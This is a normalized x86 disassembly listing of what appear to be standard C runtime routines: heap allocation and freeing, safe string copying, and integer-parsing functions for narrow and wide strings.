test edi edi
jne r-xdata
mov eax esi
cmp edi esi
jb r-xdata
push 0x20
pop edi
push 0x4
lea edi [ esi + 0x4 ]
push edi
push ebx
call sub_43bc1c
push 0x0
mov [ ebp - 0x4 ] eax
call sub_42d3b1
mov ecx [ ebp - 0x4 ]
add esp 0x10
test ecx ecx
jne r-xdata
push 0x4
push edi
push ebx
call sub_43bc1c
push 0x0
mov [ ebp - 0x4 ] eax
call sub_42d3b1
mov ecx [ ebp - 0x4 ]
add esp 0x10
test ecx ecx
jne r-xdata
lea eax [ ecx + esi * 4 ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
lea esi [ ecx + edi * 4 ]
mov eax [ rw-data ]
mov edi [ ebp - 0x4 ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
mov ecx edi
xor eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov eax esi
sub eax edi
add eax 0x3
shr eax 0x2
cmp esi edi
sbb edx edx
not edx
and edx eax
mov [ ebp - 0x4 ] edx
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov edx [ ebp - 0xc ]
xor eax eax
pop edi
pop ebx
inc eax
mov [ ecx ] edx
lea ecx [ ecx + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_42cf99
mov edi edi
push ebp
mov ebp esp
push ecx
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x2
call sub_42cbd1
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_42cfb6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ebp
retn
sub_42cff3
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
push 0x2
call sub_42cbf9
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_42d057
mov eax [ rw-data ]
push esi
push 0x20
and eax 0x1f
xor esi esi
pop ecx
sub ecx eax
ror esi cl
xor esi [ rw-data ]
push esi
call sub_430d7d
push esi
call sub_429923
push esi
call sub_43c037
push esi
call sub_429e67
push esi
call sub_417197
add esp 0x14
mov al 0x1
pop esi
retn
sub_42d09d
mov eax [ rw-data ]
or ecx 0xffffffff
push esi
[ eax ] ecx
jne r-xdata
push [ rw-data ]
call sub_42d3b1
push [ rw-data ]
xor esi esi
mov [ rw-data ] esi
call sub_42d3b1
push [ rw-data ]
mov [ rw-data ] esi
call sub_42d3b1
push [ rw-data ]
mov [ rw-data ] esi
call sub_42d3b1
add esp 0x10
mov [ rw-data ] esi
mov al 0x1
pop esi
retn
mov eax [ rw-data ]
mov esi rw-data
cmp eax esi
je r-xdata
push eax
call sub_42d3b1
pop ecx
mov [ rw-data ] esi
sub_42d117
mov edi edi
push ebp
mov ebp esp
lea eax [ ecx + 0x4 ]
mov edx eax
sub edx ecx
add edx 0x3
push esi
xor esi esi
shr edx 0x2
cmp eax ecx
sbb eax eax
not eax
and eax edx
je r-xdata
pop esi
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
inc esi
mov [ ecx ] edx
lea ecx [ ecx + 0x4 ]
cmp esi eax
jne r-xdata
sub_42d191
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
and ecx 0xfff7ffff
and eax ecx
push esi
mov esi [ ebp + 0x8 ]
test eax 0xfcf0fce0
je r-xdata
push ecx
push [ ebp + 0xc ]
test esi esi
je r-xdata
test esi esi
je r-xdata
call sub_43cce9
call sub_43cce9
mov [ esi ] eax
jmp r-xdata
call sub_430f56
push 0x16
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
jmp r-xdata
push 0x0
push 0x0
call sub_43cce9
pop ecx
pop ecx
mov [ esi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_42d218
mov edi edi
push ebp
mov ebp esp
call sub_430a7e
mov edx eax
mov eax [ edx + 0xc ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ edx + 0xc ] ecx
pop ebp
retn
mov eax sub_42d45a
sub_42d238
push 0xc
push r--data
call sub_448c20
call sub_430a7e
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
call sub_42d45a
and [ ebp - 0x4 ] 0x0
mov ecx esi
call [ r--data ]
call esi
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_42d274
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
test edx edx
je r-xdata
call sub_430f56
push 0x16
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
push edi
mov edi edx
sub esi edx
mov [ edx ] 0x0
pop edi
test ecx ecx
jne r-xdata
sub ecx 0x1
jne r-xdata
xor eax eax
jmp r-xdata
mov [ edx ] cl
call sub_430f56
push 0x22
jmp r-xdata
mov al [ esi + edi ]
mov [ edi ] al
inc edi
test al al
je r-xdata
pop esi
pop ebp
retn
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
sub_42d2ce
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
test edx edx
je r-xdata
call sub_430f56
push 0x16
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
push edi
mov edi edx
sub esi edx
mov [ edx ] 0x0
pop edi
test ecx ecx
jne r-xdata
sub ecx 0x1
jne r-xdata
xor esi esi
jmp r-xdata
mov [ edx ] cl
call sub_430f56
push 0x22
jmp r-xdata
mov al [ esi + edi ]
mov [ edi ] al
inc edi
test al al
je r-xdata
mov eax esi
pop esi
pop ebp
retn
pop esi
mov [ eax ] esi
call sub_430e30
sub_42d33d
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
push esi
push 0x1bf
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov ecx rw-data
xchg [ ecx ] eax
xor eax eax
jmp r-xdata
mov ecx esi
call [ r--data ]
call esi
mov ecx eax
mov edx rw-data
xchg [ edx ] ecx
mov ecx rw-data
xchg [ ecx ] eax
xor eax eax
jmp r-xdata
pop esi
sub_42d3b1
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_430f56
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_430edd
pop ecx
mov [ esi ] eax
pop esi
sub_42d3eb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
call sub_430f56
mov [ eax ] 0xc
xor eax eax
test esi esi
jne r-xdata
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
inc esi
jmp r-xdata
call sub_42cac5
test eax eax
je r-xdata
jmp r-xdata
push esi
call sub_429937
pop ecx
test eax eax
je r-xdata
pop esi
pop ebp
retn
sub_42d439
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov eax [ rw-data ]
not edx
mov ecx [ ebp + 0x8 ]
and edx eax
and ecx [ ebp + 0xc ]
or edx ecx
mov [ rw-data ] edx
pop ebp
retn
sub_42d45a
call sub_43c020
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_43c084
pop ecx
push 0x3
call sub_4171c4
int3
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
push 0x1
push 0x40000015
push 0x3
call sub_430c42
add esp 0xc
push 0x7
pop ecx
int 0x29
sub_42d49d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
imul esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div esi
cmp eax [ ebp + 0xc ]
jb r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
inc esi
jmp r-xdata
call sub_430f56
mov [ eax ] 0xc
xor eax eax
call sub_42cac5
test eax eax
je r-xdata
jmp r-xdata
push esi
call sub_429937
pop ecx
test eax eax
je r-xdata
pop esi
pop ebp
retn
sub_42d4fa
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test al 0x4
je r-xdata
test al 0x1
je r-xdata
mov al 0x1
pop ebp
retn
xor al al
pop ebp
retn
and eax 0x2
je r-xdata
test eax eax
jne r-xdata
cmp [ ebp + 0xc ] 0x80000000
ja r-xdata
cmp [ ebp + 0xc ] 0x7fffffff
ja r-xdata
sub_42d52d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test al 0x4
je r-xdata
test al 0x1
je r-xdata
mov al 0x1
pop ebp
retn
xor al al
pop ebp
retn
and eax 0x2
je r-xdata
test eax eax
jne r-xdata
cmp [ ebp + 0x10 ] 0x80000000
jb r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jb r-xdata
ja r-xdata
ja r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
cmp [ ebp + 0xc ] 0xffffffff
ja r-xdata
sub_42d570
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
test ecx ecx
je r-xdata
pop ebp
retn
mov [ ecx ] edx
sub_42d58b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
test ecx ecx
je r-xdata
pop ebp
retn
mov [ ecx ] edx
sub_42d5a6
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
lea ecx [ ebp + 0xc ]
push ebx
push edi
call sub_42eb52
test al al
je r-xdata
xor ebx ebx
mov edi [ ebp + 0x14 ]
test edi edi
je r-xdata
pop edi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov [ edx ] ecx
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x28 ]
call sub_41cbf0
mov eax [ ebp + 0xc ]
xor esi esi
mov [ ebp - 0xc ] esi
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp edi 0x2
jl r-xdata
mov bl [ eax ]
inc eax
mov [ ebp + 0xc ] eax
lea eax [ ebp - 0x24 ]
push eax
movzx eax bl
push 0x8
push eax
mov [ ebp - 0x4 ] bl
call sub_42ee35
add esp 0xc
test eax eax
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
cmp edi 0x24
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ ebp + 0x18 ] al
setne al
mov [ ebp - 0x8 ] eax
cmp bl 0x2d
jne r-xdata
cmp bl 0x2b
jne r-xdata
or eax 0x2
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov esi [ ebp + 0xc ]
mov esi [ ebp + 0xc ]
mov bl [ esi ]
inc esi
mov [ ebp - 0x4 ] bl
mov [ ebp + 0xc ] esi
jmp r-xdata
mov al bl
sub al 0x30
cmp al 0x9
ja r-xdata
cmp edi 0x10
jne r-xdata
test edi edi
je r-xdata
mov al bl
sub al 0x61
cmp al 0x19
ja r-xdata
movsx eax bl
add eax 0xffffffd0
jmp r-xdata
xor edx edx
or eax 0xffffffff
div edi
mov [ ebp - 0x14 ] edx
mov edx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov al bl
sub al 0x41
cmp al 0x19
ja r-xdata
movsx eax bl
add eax 0xffffffa9
jmp r-xdata
test eax eax
je r-xdata
mov al bl
sub al 0x61
cmp al 0x19
ja r-xdata
movsx ecx bl
add ecx 0xffffffd0
jmp r-xdata
or eax 0xffffffff
movsx eax bl
add eax 0xffffffc9
jmp r-xdata
mov al [ esi ]
inc esi
mov [ ebp - 0x10 ] al
mov [ ebp + 0xc ] esi
cmp al 0x78
je r-xdata
test edi edi
jne r-xdata
mov al bl
sub al 0x41
cmp al 0x19
ja r-xdata
movsx ecx bl
add ecx 0xffffffa9
jmp r-xdata
cmp ecx 0xffffffff
je r-xdata
test edi edi
jne r-xdata
cmp al 0x58
je r-xdata
push 0xa
pop edi
jmp r-xdata
or ecx 0xffffffff
movsx ecx bl
add ecx 0xffffffc9
jmp r-xdata
push [ ebp - 0x4 ]
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x8 ] edx
call sub_42eafe
mov ebx [ ebp - 0x8 ]
test bl 0x8
jne r-xdata
cmp ecx edi
jae r-xdata
mov bl [ esi ]
inc esi
mov [ ebp - 0x4 ] bl
mov [ ebp + 0xc ] esi
push 0x10
pop edi
test edi edi
jne r-xdata
mov esi [ ebp - 0xc ]
push esi
push ebx
call sub_42d4fa
pop ecx
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x18 ]
xor ebx ebx
mov [ ebp + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
or edx 0x8
mov ebx [ ebp - 0x10 ]
cmp eax ebx
jb r-xdata
push [ ebp - 0x10 ]
lea ecx [ ebp + 0xc ]
call sub_42eafe
mov esi [ ebp + 0xc ]
jmp r-xdata
push 0x8
pop edi
test bl 0x2
je r-xdata
call sub_430f56
mov [ eax ] 0x22
test bl 0x1
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
pop esi
je r-xdata
imul eax edi
add eax ecx
mov [ ebp - 0xc ] eax
jne r-xdata
mov ebx esi
neg esi
test bl 0x2
je r-xdata
or esi 0xffffffff
jmp r-xdata
mov edx [ ebp + 0x10 ]
test edx edx
je r-xdata
mov eax [ ebp - 0x28 ]
and [ eax + 0x350 ] 0xfffffffd
jmp r-xdata
lea ecx [ ebx - 0x30 ]
cmp cl 0x9
ja r-xdata
or edx 0x4
jmp r-xdata
cmp ecx [ ebp - 0x14 ]
jbe r-xdata
mov ebx 0x7fffffff
jmp r-xdata
mov ebx 0x80000000
jmp r-xdata
mov bl [ esi ]
inc esi
mov [ ebp - 0x4 ] bl
mov [ ebp + 0xc ] esi
jmp r-xdata
sub_42d7ce
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
lea ecx [ ebp + 0xc ]
push ebx
push edi
call sub_42eb6d
test al al
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x14 ]
push 0x2
pop edi
test eax eax
je r-xdata
pop edi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov [ edx ] ecx
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
call sub_41cbf0
mov eax [ ebp + 0xc ]
xor esi esi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp eax edi
jl r-xdata
movzx esi [ eax ]
add eax edi
push 0x8
push esi
mov [ ebp + 0xc ] eax
call sub_43d25c
pop ecx
pop ecx
test eax eax
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
cmp eax 0x24
jle r-xdata
mov eax [ ebp + 0xc ]
xor ebx ebx
cmp [ ebp + 0x18 ] bl
setne bl
cmp si 0x2d
jne r-xdata
cmp si 0x2b
jne r-xdata
or ebx edi
jmp r-xdata
mov edi [ ebp + 0xc ]
mov edi [ ebp + 0xc ]
movzx esi [ edi ]
add edi 0x2
mov [ ebp + 0xc ] edi
jmp r-xdata
cmp si ax
jb r-xdata
cmp ecx edx
jne r-xdata
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x4 ] 0x19
push 0x30
pop eax
push 0x10
pop edx
test ecx ecx
je r-xdata
push 0x41
pop eax
cmp ax si
ja r-xdata
push 0x3a
pop eax
cmp si ax
jae r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
mov ecx eax
lea eax [ esi - 0x61 ]
cmp ax [ ebp - 0x4 ]
ja r-xdata
push 0x5a
pop eax
cmp si ax
jbe r-xdata
mov eax 0xff10
cmp si ax
jae r-xdata
movzx eax si
sub eax 0x30
jmp r-xdata
push 0x41
pop eax
cmp ax si
ja r-xdata
push 0x3a
pop eax
cmp si ax
jae r-xdata
or eax 0xffffffff
lea eax [ esi - 0x61 ]
cmp ax [ ebp - 0x4 ]
movzx eax si
ja r-xdata
mov eax 0xff1a
cmp si ax
jae r-xdata
mov eax 0x660
cmp si ax
jb r-xdata
cmp eax 0xffffffff
jne r-xdata
lea eax [ esi - 0x61 ]
cmp ax [ ebp - 0x4 ]
ja r-xdata
push 0x5a
pop eax
cmp si ax
jbe r-xdata
mov eax 0xff10
cmp si ax
jae r-xdata
movzx eax si
sub eax 0x30
jmp r-xdata
movzx eax [ edi ]
add edi 0x2
mov [ ebp + 0xc ] edi
cmp eax 0x78
je r-xdata
test ecx ecx
jne r-xdata
add eax 0xffffffc9
jmp r-xdata
sub eax 0x20
or eax 0xffffffff
movzx eax si
sub eax 0xff10
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
test eax eax
je r-xdata
or eax 0xffffffff
lea eax [ esi - 0x61 ]
cmp ax [ ebp - 0x4 ]
movzx eax si
ja r-xdata
mov eax 0xff1a
cmp si ax
jae r-xdata
mov eax 0x660
cmp si ax
jb r-xdata
cmp eax 0xffffffff
jne r-xdata
test ecx ecx
jne r-xdata
cmp eax 0x58
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
mov eax 0x6f0
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x660
jmp r-xdata
push esi
lea ecx [ ebp + 0xc ]
call sub_42eb26
test bl 0x8
jne r-xdata
cmp eax [ ebp + 0x14 ]
jae r-xdata
add eax 0xffffffc9
jmp r-xdata
sub eax 0x20
or eax 0xffffffff
movzx eax si
sub eax 0xff10
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
cmp eax 0xffffffff
je r-xdata
movzx esi [ edi ]
add edi 0x2
mov [ ebp + 0xc ] edi
mov [ ebp + 0x14 ] edx
test ecx ecx
jne r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov esi [ ebp - 0x8 ]
push esi
push ebx
call sub_42d4fa
pop ecx
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0xc ]
xor ebx ebx
mov [ ebp + 0xc ] eax
jmp r-xdata
mov esi [ ebp - 0x8 ]
or ebx 0x8
cmp esi ecx
jb r-xdata
mov eax 0x6f0
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x660
jmp r-xdata
push eax
lea ecx [ ebp + 0xc ]
call sub_42eb26
mov edi [ ebp + 0xc ]
jmp r-xdata
mov [ ebp + 0x14 ] 0x8
mov eax 0x966
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x6f0
jmp r-xdata
test bl 0x2
je r-xdata
call sub_430f56
mov [ eax ] 0x22
test bl 0x1
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
pop esi
je r-xdata
imul esi [ ebp + 0x14 ]
add esi eax
mov [ ebp - 0x8 ] esi
jne r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov ebx esi
neg esi
test bl 0x2
je r-xdata
or esi 0xffffffff
jmp r-xdata
mov edx [ ebp + 0x10 ]
test edx edx
je r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x350 ] 0xfffffffd
jmp r-xdata
push 0x30
pop eax
cmp si ax
jb r-xdata
or ebx 0x4
jmp r-xdata
cmp eax edx
jbe r-xdata
mov eax 0x966
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x6f0
jmp r-xdata
mov eax 0x9e6
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x966
jmp r-xdata
mov ebx 0x7fffffff
jmp r-xdata
mov ebx 0x80000000
jmp r-xdata
movzx esi [ edi ]
add edi 0x2
mov [ ebp + 0xc ] edi
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0x9e6
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x966
jmp r-xdata
mov eax 0xa66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x9e6
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0xa66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x9e6
jmp r-xdata
mov eax 0xae6
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xa66
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0xae6
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xa66
jmp r-xdata
mov eax 0xb66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xae6
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0xb66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xae6
jmp r-xdata
mov eax 0xc66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xb66
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0xc66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xb66
jmp r-xdata
mov eax 0xce6
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xc66
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0xce6
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xc66
jmp r-xdata
mov eax 0xd66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xce6
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0xd66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xce6
jmp r-xdata
mov eax 0xe50
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xd66
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0xe50
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xd66
jmp r-xdata
mov eax 0xed0
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xe50
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0xed0
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xe50
jmp r-xdata
mov eax 0xf20
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xed0
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0xf20
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xed0
jmp r-xdata
mov eax 0x1040
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xf20
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0x1040
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xf20
jmp r-xdata
mov eax 0x17e0
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x1040
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0x17e0
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x1040
jmp r-xdata
mov eax 0x1810
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x17e0
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
add eax 0xa
cmp si ax
jae r-xdata
mov eax 0x1810
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x17e0
jmp r-xdata
movzx eax si
sub eax 0x1810
jmp r-xdata
add eax 0xa
cmp si ax
jae r-xdata
movzx eax si
sub eax 0x1810
jmp r-xdata
sub_42deb3
mov edi edi
push ebp
mov ebp esp
sub esp 0x40
lea ecx [ ebp + 0xc ]
push esi
push edi
call sub_42eb52
test al al
je r-xdata
xor eax eax
mov edi eax
mov esi eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax edi
mov edx esi
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
push ebx
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x40 ]
call sub_41cbf0
xor eax eax
mov [ ebp - 0x10 ] eax
mov esi eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x30 ] eax
jmp r-xdata
cmp eax 0x2
jl r-xdata
mov bl [ eax ]
inc eax
mov [ ebp + 0xc ] eax
lea eax [ ebp - 0x3c ]
push eax
movzx eax bl
push 0x8
push eax
mov [ ebp - 0xc ] bl
mov [ ebp - 0x1 ] bl
call sub_42ee35
add esp 0xc
test eax eax
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
cmp eax 0x24
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ ebp + 0x18 ] al
setne al
mov [ ebp - 0x8 ] eax
cmp bl 0x2d
jne r-xdata
cmp bl 0x2b
jne r-xdata
or eax 0x2
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov edi [ ebp + 0xc ]
mov edi [ ebp + 0xc ]
mov bl [ edi ]
inc edi
mov [ ebp - 0x1 ] bl
mov [ ebp - 0xc ] bl
mov [ ebp + 0xc ] edi
jmp r-xdata
mov al bl
sub al 0x30
cmp al 0x9
ja r-xdata
cmp ecx edx
jne r-xdata
mov ecx [ ebp + 0x14 ]
push 0x10
pop edx
test ecx ecx
je r-xdata
mov al bl
sub al 0x61
cmp al 0x19
ja r-xdata
movsx eax bl
add eax 0xffffffd0
jmp r-xdata
mov eax ecx
mov al bl
sub al 0x41
cmp al 0x19
ja r-xdata
movsx eax bl
add eax 0xffffffa9
jmp r-xdata
test eax eax
je r-xdata
mov al cl
sub al 0x61
cmp al 0x19
ja r-xdata
movsx edx cl
add edx 0xffffffd0
jmp r-xdata
or eax 0xffffffff
movsx eax bl
add eax 0xffffffc9
jmp r-xdata
mov al [ edi ]
inc edi
mov [ ebp - 0x1c ] al
mov [ ebp + 0xc ] edi
cmp al 0x78
je r-xdata
test ecx ecx
jne r-xdata
mov al cl
sub al 0x41
cmp al 0x19
ja r-xdata
movsx edx cl
add edx 0xffffffa9
jmp r-xdata
mov [ ebp - 0x14 ] edx
cmp edx 0xffffffff
je r-xdata
test ecx ecx
jne r-xdata
cmp al 0x58
je r-xdata
push 0xa
pop eax
mov [ ebp + 0x14 ] eax
jmp r-xdata
or edx 0xffffffff
movsx edx cl
add edx 0xffffffc9
jmp r-xdata
push [ ebp - 0xc ]
lea ecx [ ebp + 0xc ]
call sub_42eafe
mov eax [ ebp - 0x8 ]
test al 0x8
jne r-xdata
cmp edx [ ebp + 0x14 ]
jae r-xdata
mov al [ edi ]
inc edi
mov [ ebp - 0x1 ] al
mov [ ebp - 0xc ] al
mov [ ebp + 0xc ] edi
jmp r-xdata
mov [ ebp + 0x14 ] edx
test ecx ecx
jne r-xdata
cdq
mov ecx edx
mov [ ebp - 0x2c ] eax
push ecx
push eax
push 0xffffffff
push 0xffffffff
mov [ ebp - 0x28 ] ecx
call sub_448b80
mov [ ebp - 0x24 ] ecx
mov cl [ ebp - 0x1 ]
mov [ ebp - 0x20 ] ebx
xor ebx ebx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] edx
mov edi [ ebp - 0x10 ]
push esi
push edi
push eax
call sub_42d52d
add esp 0xc
test al al
je r-xdata
mov eax [ ebp - 0x30 ]
mov [ ebp + 0xc ] eax
xor eax eax
mov esi eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
or ecx 0x8
mov [ ebp - 0x8 ] ecx
cmp esi [ ebp - 0x1c ]
jb r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
push [ ebp - 0x1c ]
lea ecx [ ebp + 0xc ]
call sub_42eafe
mov edi [ ebp + 0xc ]
mov [ ebp + 0x14 ] 0x8
test [ ebp - 0x8 ] 0x2
je r-xdata
call sub_430f56
mov [ eax ] 0x22
mov eax [ ebp - 0x8 ]
test al 0x1
jne r-xdata
mov edi eax
jmp r-xdata
push esi
push eax
push [ ebp - 0x28 ]
push [ ebp - 0x2c ]
call sub_448d60
add eax [ ebp - 0x14 ]
mov esi edx
mov [ ebp - 0x10 ] eax
adc esi ebx
ja r-xdata
cmp [ ebp - 0x34 ] 0x0
pop ebx
je r-xdata
neg edi
adc esi ebx
neg esi
test al 0x2
je r-xdata
or edi 0xffffffff
or esi 0xffffffff
jmp r-xdata
mov al cl
sub al 0x30
cmp al 0x9
ja r-xdata
cmp eax [ ebp - 0x18 ]
jne r-xdata
cmp eax [ ebp - 0x18 ]
jb r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x40 ]
